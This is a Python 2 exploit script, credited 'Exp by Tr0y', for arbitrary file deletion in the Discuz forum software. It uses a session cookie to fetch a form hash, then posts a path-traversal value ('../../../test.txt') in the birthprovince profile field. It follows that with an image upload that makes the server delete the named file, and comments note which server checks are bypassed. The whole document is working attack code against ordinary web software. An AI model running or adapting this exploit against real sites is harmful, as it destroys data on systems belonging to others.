import requests
import re
import sys


filepath = '../../../test.txt'
HashUrl= '/home.php?mod=spacecp'
ExpUrl = '/home.php?mod=spacecp&ac=profile&op=base'

heads = {
"Cookie": "R98R_2132_sid=uIwx30; R98R_2132_saltkey=ZfMPeG8T; R98R_2132_lastvisit=1524725697; R98R_2132_lastact=1524729433%09misc.php%09patch; R98R_2132_sendmail=1; R98R_2132__refer=%252FDiscuz%252Fupload%252Fhome.php%253Fmod%253Dspacecp; R98R_2132_seccode=6.e82c9961ebeb572ac1; R98R_2132_home_readfeed=1524729307; R98R_2132_onlineusernum=2; R98R_2132_ulastactivity=77d8RxCUWyDPKNhcjeQio8LJ3J8l5X1OFJlVnzRJWkaoIwn31iUg; R98R_2132_auth=6feac1%2BRPMBYeq%2F8Rad4pgdy8oVsryQNd50dN2ghe4985fhLIN3Ia23l1%2BvZBEYeKQml%2BBQ%2B6odORlVkQzTQ; R98R_2132_lastcheckfeed=2%7C1524729428; R98R_2132_checkfollow=1; R98R_2132_lip=%3A%3A1%2C1524729433; R98R_2132_nofavfid=1; R98R_2132_checkpm=1"
}

Host = 'http://localhost/Discuz/upload'

print '[+]Exp by Tr0y'
formhash = re.findall('formhash" value="(.+)" />', requests.get(Host+HashUrl, headers=heads).text)
if not formhash: sys.exit('Your Cookie is out of date!')
formhash = formhash[0]

print '  [-]Got formhash:', formhash


datas = {
    'birthprovince': filepath, # bypass isset($_POST['birthprovince']) in 100
    'profilesubmit': '1', # bypass submitcheck('profilesubmit') in 71
    'formhash': formhash
}
if 'show_success' not in requests.post(Host+ExpUrl, headers=heads, data=datas).text:
    sys.exit('  [-]Exp Failed!')

files = {
    "birthprovince" : ("2.png", open("D:\\2.png", "rb"), "image/jpeg") # Your path of pic
}
if 'show_success' not in requests.post(Host+ExpUrl, data=datas, headers=heads, files=files).text:
    sys.exit('  [-]Exp Failed!')
else:
    print '  [-]Exp Successfully!', filepath, 'has been deleted!'

print '[!]All Done'